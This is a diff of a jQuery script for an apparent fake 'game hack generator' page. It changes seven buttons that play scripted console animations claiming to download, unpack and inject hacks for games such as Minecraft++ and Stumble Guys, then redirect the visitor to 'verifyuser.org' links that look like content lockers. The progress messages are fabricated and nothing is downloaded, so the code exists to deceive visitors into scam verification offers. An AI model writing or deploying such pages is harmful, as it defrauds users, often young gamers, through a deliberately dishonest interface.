@@ -37,100 +37,13 @@ $(document).ready(function() {
 			width: progressBarWidth
 		}, 500).html(percent + "%&nbsp;");
 	}
-	progressBar(20, $('#progressBar'));
-	var select = $("#resource-item-1-amount-wrapper");
-	var slider = $("<div id='slider-resource-1'></div>").insertAfter(select).slider({
-		min: 14000,
-		max: 99000,
-		value: 20000,
-		range: "min",
-		change: function(event, ui) {
-			var sliderValue = $("#slider-resource-1").slider("option", "value");
-			$('#resource-1-amount').html(sliderValue);
-			if (sliderValue == '14000') {
-				progressBar(20, $('#progressBar'));
-				$('#decrease-resource-1').addClass('btn-disabled');
-			} else if (sliderValue == '40000') {
-				progressBar(40, $('#progressBar'));
-				$('#decrease-resource-1').removeClass('btn-disabled');
-			} else if (sliderValue == '60000') {
-				progressBar(60, $('#progressBar'));
-			} else if (sliderValue == '80000') {
-				progressBar(80, $('#progressBar'));
-				$('#increase-resource-1').removeClass('btn-disabled');
-			} else if (sliderValue == '99000') {
-				progressBar(100, $('#progressBar'));
-				$('#increase-resource-1').addClass('btn-disabled');
-			}
-		}
-	});
 	function progressBarConsole(percent, $element) {
 		var progressBarConsoleWidth = percent * $element.width() / 100;
 		$element.find('div').animate({
 			width: progressBarConsoleWidth
 		}, 500).html(percent + "%&nbsp;");
 	}
-	progressBarConsole(1, $('#progressBarConsole'));
-	$('#connect-button').click(function() {
-		if ($('#coc-player-tag').val().length > 2) {
-			$.magnificPopup.open({
-				items: {
-					src: '#message-wrapper',
-				},
-				type: 'inline',
-				preloader: false,
-				modal: true,
-				mainClass: 'mfp-fade'
-			});
-			$('.message-header h3').html("Connecting Account");
-			$('.message-header p.message-header-subtitle').html("Please wait for generator to connect with your account.");
-			$(".message-content p.console-message").fadeIn();
-			var $console_message_username_msg = $('#coc-player-tag').val();
-			var $console_message_platform_msg = $('#coc-player-platform').val();
-			setTimeout(function() {
-				$(".console-loadbar").fadeIn();
-				$(".message-content p.console-message").typed({
-					strings: ["Connecting to Username <span class='console-message-connected-item'>" + $console_message_username_msg + "</span> on <span class='console-message-connected-item'>" + $console_message_platform_msg + "</span>"],
-					showCursor: false,
-					typeSpeed: -50,
-					onStringTyped: function() {
-						progressBar(20, $('#progressBarConsole'));
-					}
-				});
-			}, 500);
-			setTimeout(function() {
-				$(".message-content p.console-message").addClass('bounce animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
-					$(this).removeClass('bounce animated');
-				});
-			}, 3500);
-			setTimeout(function() {
-				$(".message-content p.console-message").typed({
-					strings: ["Connected to Username <span class='console-message-connected-item'>" + $console_message_username_msg + "</span>"],
-					showCursor: false,
-					typeSpeed: -50,
-					onStringTyped: function() {
-						progressBar(100, $('#progressBarConsole'));
-						setTimeout(function() {
-							$('#resources-select-wrapper').removeClass('resources-select-wrapper-blurred');
-							$('#account-information-wrapper').addClass('account-wrapper-blurred');
-							$('#blurred-account').fadeIn();
-							$('#blurred-resources').remove();
-							$.magnificPopup.close();
-							$(".message-content p.console-message").hide();
-							progressBar(0, $('#progressBarConsole'));
-							progressBar(20, $('#progressBar'));
-							progressBarResource2(20, $('#progressBarResource2'));
-							$('html, body').animate({
-								scrollTop: $("#resources-select-wrapper").offset().top
-							}, 2000);
-						}, 1500);
-					}
-				});
-			}, 4800);
-		} else {
-			sweetAlert("Error", "Please enter your Username.", "error");
-		}
-	});
+	
 	$('.start1-button').click(function() {
 		$(".message-content p.console-message").hide();
 		$.magnificPopup.open({
@@ -143,71 +56,49 @@ $(document).ready(function() {
 			mainClass: 'mfp-fade'
 		});
 		progressBar(0, $('#progressBarConsole'));
-		$('.message-header h3').html("APK Tweaks");
-		$('.message-header p.message-header-subtitle').html("You are about to download apps");
 		$(".message-content p.console-message").fadeIn();
-		var $console_message_username_msg = $('#coc-player-tag').val();
-		var $console_message_platform_msg = $('#coc-player-platform').val();
-		var $console_message_resource1_msg = $('#slider-resource-1').slider("option", "value");
-		var $console_message_resource2_msg = $('#slider-resource-2').slider("option", "value");
 		setTimeout(function() {
 			$(".console-loadbar").fadeIn();
 			$(".message-content p.console-message").typed({
-				strings: ["Processing..."],
+				strings: ["Downloading Don't Starve Hack.gz"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
-					progressBar(2, $('#progressBarConsole'));
+					progressBar(20, $('#progressBarConsole'));
 				}
 			});
 		}, 200);
 		setTimeout(function() {
 			$(".message-content p.console-message").typed({
-				strings: ["Downloading Files..."],
+				strings: ["Unpacking Don't Starve Hack.gz"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
-					progressBar(25, $('#progressBarConsole'));
+					progressBar(40, $('#progressBarConsole'));
 				}
 			});
-		}, 2400);
+		}, 5000);
 		setTimeout(function() {
 			$(".message-content p.console-message").typed({
-				strings: ["Unpacking Files..."],
-				showCursor: false,
-				typeSpeed: -50,
-				onStringTyped: function() {
-					progressBar(50, $('#progressBarConsole'));
-				}
-			});
-		}, 6500);
-		setTimeout(function() {
-			$(".message-content p.console-message").typed({
-				strings: ["Forming Data Packets..."],
+				strings: ["Starting Injection"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
 					progressBar(60, $('#progressBarConsole'));
 				}
 			});
-		}, 9500);
+		}, 10000);
 		setTimeout(function() {
 			$(".message-content p.console-message").typed({
-				strings: ["Injecting Data Packets..."],
+				strings: ["Setting Up Final Stage"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
 					progressBar(80, $('#progressBarConsole'));
 				}
 			});
-		}, 11500);
-		setTimeout(function() {
-			$(".message-content p.console-message").fadeOut(function() {
-				$(".human-verification-wrapper").fadeIn();
-				window.location.href="https://verifyuser.org/cl/i/j6redp";
-
-			});
-		}, 14800);
+			window.location.href="https://verifyuser.org/cl/i/j6redp";
+		}, 15000);
 	});
 	$('.start2-button').click(function() {
 		$(".message-content p.console-message").hide();
@@ -221,70 +112,49 @@ $(document).ready(function() {
 			mainClass: 'mfp-fade'
 		});
 		progressBar(0, $('#progressBarConsole'));
-		$('.message-header h3').html("APK Tweaks");
-		$('.message-header p.message-header-subtitle').html("You are about to download apps");
 		$(".message-content p.console-message").fadeIn();
-		var $console_message_username_msg = $('#coc-player-tag').val();
-		var $console_message_platform_msg = $('#coc-player-platform').val();
-		var $console_message_resource1_msg = $('#slider-resource-1').slider("option", "value");
-		var $console_message_resource2_msg = $('#slider-resource-2').slider("option", "value");
 		setTimeout(function() {
 			$(".console-loadbar").fadeIn();
 			$(".message-content p.console-message").typed({
-				strings: ["Processing..."],
+				strings: ["Downloading Minecraft++ Hack.gz"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
-					progressBar(2, $('#progressBarConsole'));
+					progressBar(20, $('#progressBarConsole'));
 				}
 			});
 		}, 200);
 		setTimeout(function() {
 			$(".message-content p.console-message").typed({
-				strings: ["Downloading Files..."],
+				strings: ["Unpacking Minecraft++ Hack.gz"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
-					progressBar(25, $('#progressBarConsole'));
+					progressBar(40, $('#progressBarConsole'));
 				}
 			});
-		}, 2400);
+		}, 5000);
 		setTimeout(function() {
 			$(".message-content p.console-message").typed({
-				strings: ["Unpacking Files..."],
-				showCursor: false,
-				typeSpeed: -50,
-				onStringTyped: function() {
-					progressBar(50, $('#progressBarConsole'));
-				}
-			});
-		}, 6500);
-		setTimeout(function() {
-			$(".message-content p.console-message").typed({
-				strings: ["Forming Data Packets..."],
+				strings: ["Starting Injection"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
 					progressBar(60, $('#progressBarConsole'));
 				}
 			});
-		}, 9500);
+		}, 10000);
 		setTimeout(function() {
 			$(".message-content p.console-message").typed({
-				strings: ["Injecting Data Packets..."],
+				strings: ["Setting Up Final Stage"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
 					progressBar(80, $('#progressBarConsole'));
 				}
 			});
-		}, 11500);
-		setTimeout(function() {
-			$(".message-content p.console-message").fadeOut(function() {
-				$(".human-verification-wrapper").fadeIn();
-				window.location.href="https://verifyuser.org/cl/i/5kpj7v";
-			});
-		}, 14800);
+			window.location.href="https://verifyuser.org/cl/i/5kpj7v";
+		}, 15000);
 	});
 	$('.start3-button').click(function() {
 		$(".message-content p.console-message").hide();
@@ -298,71 +168,50 @@ $(document).ready(function() {
 			mainClass: 'mfp-fade'
 		});
 		progressBar(0, $('#progressBarConsole'));
-		$('.message-header h3').html("APK Tweaks");
-		$('.message-header p.message-header-subtitle').html("You are about to download apps");
 		$(".message-content p.console-message").fadeIn();
-		var $console_message_username_msg = $('#coc-player-tag').val();
-		var $console_message_platform_msg = $('#coc-player-platform').val();
-		var $console_message_resource1_msg = $('#slider-resource-1').slider("option", "value");
-		var $console_message_resource2_msg = $('#slider-resource-2').slider("option", "value");
 		setTimeout(function() {
 			$(".console-loadbar").fadeIn();
 			$(".message-content p.console-message").typed({
-				strings: ["Processing..."],
+				strings: ["Downloading Cooking Madness Hack.gz"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
-					progressBar(2, $('#progressBarConsole'));
+					progressBar(20, $('#progressBarConsole'));
 				}
 			});
 		}, 200);
 		setTimeout(function() {
 			$(".message-content p.console-message").typed({
-				strings: ["Downloading Files..."],
+				strings: ["Unpacking Cooking Madness Hack.gz"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
-					progressBar(25, $('#progressBarConsole'));
+					progressBar(40, $('#progressBarConsole'));
 				}
 			});
-		}, 2400);
+		}, 5000);
 		setTimeout(function() {
 			$(".message-content p.console-message").typed({
-				strings: ["Unpacking Files..."],
-				showCursor: false,
-				typeSpeed: -50,
-				onStringTyped: function() {
-					progressBar(50, $('#progressBarConsole'));
-				}
-			});
-		}, 6500);
-		setTimeout(function() {
-			$(".message-content p.console-message").typed({
-				strings: ["Forming Data Packets..."],
+				strings: ["Starting Injection"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
 					progressBar(60, $('#progressBarConsole'));
 				}
 			});
-		}, 9500);
+		}, 10000);
 		setTimeout(function() {
 			$(".message-content p.console-message").typed({
-				strings: ["Injecting Data Packets..."],
+				strings: ["Setting Up Final Stage"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
 					progressBar(80, $('#progressBarConsole'));
 				}
 			});
-		}, 11500);
-		setTimeout(function() {
-			$(".message-content p.console-message").fadeOut(function() {
-				$(".human-verification-wrapper").fadeIn();
-				window.location.href="https://verifysuper.com/cl/i/e6lork";
-			});
-		}, 14800);
-	});	
+			window.location.href="https://verifyuser.org/cl/i/e6lork";
+		}, 15000);
+	});
 	$('.start4-button').click(function() {
 		$(".message-content p.console-message").hide();
 		$.magnificPopup.open({
@@ -375,71 +224,50 @@ $(document).ready(function() {
 			mainClass: 'mfp-fade'
 		});
 		progressBar(0, $('#progressBarConsole'));
-		$('.message-header h3').html("APK Tweaks");
-		$('.message-header p.message-header-subtitle').html("You are about to download apps");
 		$(".message-content p.console-message").fadeIn();
-		var $console_message_username_msg = $('#coc-player-tag').val();
-		var $console_message_platform_msg = $('#coc-player-platform').val();
-		var $console_message_resource1_msg = $('#slider-resource-1').slider("option", "value");
-		var $console_message_resource2_msg = $('#slider-resource-2').slider("option", "value");
 		setTimeout(function() {
 			$(".console-loadbar").fadeIn();
 			$(".message-content p.console-message").typed({
-				strings: ["Processing..."],
+				strings: ["Downloading Merge Villa Hack.gz"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
-					progressBar(2, $('#progressBarConsole'));
+					progressBar(20, $('#progressBarConsole'));
 				}
 			});
 		}, 200);
 		setTimeout(function() {
 			$(".message-content p.console-message").typed({
-				strings: ["Downloading Files..."],
+				strings: ["Unpacking Merge Villa Hack.gz"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
-					progressBar(25, $('#progressBarConsole'));
+					progressBar(40, $('#progressBarConsole'));
 				}
 			});
-		}, 2400);
+		}, 5000);
 		setTimeout(function() {
 			$(".message-content p.console-message").typed({
-				strings: ["Unpacking Files..."],
-				showCursor: false,
-				typeSpeed: -50,
-				onStringTyped: function() {
-					progressBar(50, $('#progressBarConsole'));
-				}
-			});
-		}, 6500);
-		setTimeout(function() {
-			$(".message-content p.console-message").typed({
-				strings: ["Forming Data Packets..."],
+				strings: ["Starting Injection"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
 					progressBar(60, $('#progressBarConsole'));
 				}
 			});
-		}, 9500);
+		}, 10000);
 		setTimeout(function() {
 			$(".message-content p.console-message").typed({
-				strings: ["Injecting Data Packets..."],
+				strings: ["Setting Up Final Stage"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
 					progressBar(80, $('#progressBarConsole'));
 				}
 			});
-		}, 11500);
-		setTimeout(function() {
-			$(".message-content p.console-message").fadeOut(function() {
-				$(".human-verification-wrapper").fadeIn();
-				window.location.href="https://verifyuser.org/cl/i/kl7ngg";
-			});
-		}, 14800);
-	});	
+			window.location.href="https://verifyuser.org/cl/i/kl7ngg";
+		}, 15000);
+	});
 	$('.start5-button').click(function() {
 		$(".message-content p.console-message").hide();
 		$.magnificPopup.open({
@@ -452,71 +280,50 @@ $(document).ready(function() {
 			mainClass: 'mfp-fade'
 		});
 		progressBar(0, $('#progressBarConsole'));
-		$('.message-header h3').html("APK Tweaks");
-		$('.message-header p.message-header-subtitle').html("You are about to download apps");
 		$(".message-content p.console-message").fadeIn();
-		var $console_message_username_msg = $('#coc-player-tag').val();
-		var $console_message_platform_msg = $('#coc-player-platform').val();
-		var $console_message_resource1_msg = $('#slider-resource-1').slider("option", "value");
-		var $console_message_resource2_msg = $('#slider-resource-2').slider("option", "value");
 		setTimeout(function() {
 			$(".console-loadbar").fadeIn();
 			$(".message-content p.console-message").typed({
-				strings: ["Processing..."],
+				strings: ["Downloading Merge Mansion Hack.gz"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
-					progressBar(2, $('#progressBarConsole'));
+					progressBar(20, $('#progressBarConsole'));
 				}
 			});
 		}, 200);
 		setTimeout(function() {
 			$(".message-content p.console-message").typed({
-				strings: ["Downloading Files..."],
+				strings: ["Unpacking Merge Mansion Hack.gz"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
-					progressBar(25, $('#progressBarConsole'));
+					progressBar(40, $('#progressBarConsole'));
 				}
 			});
-		}, 2400);
+		}, 5000);
 		setTimeout(function() {
 			$(".message-content p.console-message").typed({
-				strings: ["Unpacking Files..."],
-				showCursor: false,
-				typeSpeed: -50,
-				onStringTyped: function() {
-					progressBar(50, $('#progressBarConsole'));
-				}
-			});
-		}, 6500);
-		setTimeout(function() {
-			$(".message-content p.console-message").typed({
-				strings: ["Forming Data Packets..."],
+				strings: ["Starting Injection"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
 					progressBar(60, $('#progressBarConsole'));
 				}
 			});
-		}, 9500);
+		}, 10000);
 		setTimeout(function() {
 			$(".message-content p.console-message").typed({
-				strings: ["Injecting Data Packets..."],
+				strings: ["Setting Up Final Stage"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
 					progressBar(80, $('#progressBarConsole'));
 				}
 			});
-		}, 11500);
-		setTimeout(function() {
-			$(".message-content p.console-message").fadeOut(function() {
-				$(".human-verification-wrapper").fadeIn();
-				window.location.href="https://mobileverify.net/cl/i/m4rlw";
-			});
-		}, 14800);
-	});	
+			window.location.href="https://verifyuser.org/cl/i/m4rlw";
+		}, 15000);
+	});
 	$('.start6-button').click(function() {
 		$(".message-content p.console-message").hide();
 		$.magnificPopup.open({
@@ -529,70 +336,105 @@ $(document).ready(function() {
 			mainClass: 'mfp-fade'
 		});
 		progressBar(0, $('#progressBarConsole'));
-		$('.message-header h3').html("APK Tweaks");
-		$('.message-header p.message-header-subtitle').html("You are about to download apps");
 		$(".message-content p.console-message").fadeIn();
-		var $console_message_username_msg = $('#coc-player-tag').val();
-		var $console_message_platform_msg = $('#coc-player-platform').val();
-		var $console_message_resource1_msg = $('#slider-resource-1').slider("option", "value");
-		var $console_message_resource2_msg = $('#slider-resource-2').slider("option", "value");
 		setTimeout(function() {
 			$(".console-loadbar").fadeIn();
 			$(".message-content p.console-message").typed({
-				strings: ["Processing..."],
+				strings: ["Downloading Dragonscapes Hack.gz"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
-					progressBar(2, $('#progressBarConsole'));
+					progressBar(20, $('#progressBarConsole'));
 				}
 			});
 		}, 200);
 		setTimeout(function() {
 			$(".message-content p.console-message").typed({
-				strings: ["Downloading Files..."],
+				strings: ["Unpacking Dragonscapes Hack.gz"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
-					progressBar(25, $('#progressBarConsole'));
+					progressBar(40, $('#progressBarConsole'));
 				}
 			});
-		}, 2400);
+		}, 5000);
 		setTimeout(function() {
 			$(".message-content p.console-message").typed({
-				strings: ["Unpacking Files..."],
-				showCursor: false,
-				typeSpeed: -50,
-				onStringTyped: function() {
-					progressBar(50, $('#progressBarConsole'));
-				}
-			});
-		}, 6500);
-		setTimeout(function() {
-			$(".message-content p.console-message").typed({
-				strings: ["Forming Data Packets..."],
+				strings: ["Starting Injection"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
 					progressBar(60, $('#progressBarConsole'));
 				}
 			});
-		}, 9500);
+		}, 10000);
 		setTimeout(function() {
 			$(".message-content p.console-message").typed({
-				strings: ["Injecting Data Packets..."],
+				strings: ["Setting Up Final Stage"],
 				showCursor: false,
 				typeSpeed: -50,
 				onStringTyped: function() {
 					progressBar(80, $('#progressBarConsole'));
 				}
 			});
-		}, 11500);
+			window.location.href="https://verifyuser.org/cl/i/kjg8e";
+		}, 15000);
+	});
+	$('.start7-button').click(function() {
+		$(".message-content p.console-message").hide();
+		$.magnificPopup.open({
+			items: {
+				src: '#message-wrapper',
+			},
+			type: 'inline',
+			preloader: false,
+			modal: true,
+			mainClass: 'mfp-fade'
+		});
+		progressBar(0, $('#progressBarConsole'));
+		$(".message-content p.console-message").fadeIn();
 		setTimeout(function() {
-			$(".message-content p.console-message").fadeOut(function() {
-				$(".human-verification-wrapper").fadeIn();
-				window.location.href="https://verifyuser.org/cl/i/kjg8e";
+			$(".console-loadbar").fadeIn();
+			$(".message-content p.console-message").typed({
+				strings: ["Downloading Stumble Guys Hack.gz"],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(20, $('#progressBarConsole'));
+				}
 			});
-		}, 14800);
+		}, 200);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Unpacking Stumble Guys Hack.gz"],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(40, $('#progressBarConsole'));
+				}
+			});
+		}, 5000);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Starting Injection"],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(60, $('#progressBarConsole'));
+				}
+			});
+		}, 10000);
+		setTimeout(function() {
+			$(".message-content p.console-message").typed({
+				strings: ["Setting Up Final Stage"],
+				showCursor: false,
+				typeSpeed: -50,
+				onStringTyped: function() {
+					progressBar(80, $('#progressBarConsole'));
+				}
+			});
+			window.location.href="https://verifyuser.org/cl/i/klkg19";
+		}, 15000);
 	});
 	
 	
